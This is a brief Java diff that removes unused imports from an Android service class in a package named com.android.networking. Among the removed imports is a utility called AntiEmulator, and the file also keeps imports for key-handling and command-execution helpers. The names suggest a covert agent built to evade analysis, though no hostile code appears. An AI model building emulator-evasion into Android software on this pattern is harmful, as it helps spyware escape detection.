@@ -21,13 +21,11 @@ import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 
-import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
-import android.content.ContextWrapper;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
@@ -44,11 +42,9 @@ import android.widget.Toast;
 import com.android.networking.auto.Cfg;
 import com.android.networking.capabilities.PackageInfo;
 import com.android.networking.crypto.Keys;
-import com.android.networking.util.AntiEmulator;
 import com.android.networking.util.Check;
 import com.android.networking.util.Execute;
 import com.android.networking.util.Utils;
-import com.android.networking.R;
 
 
 /**
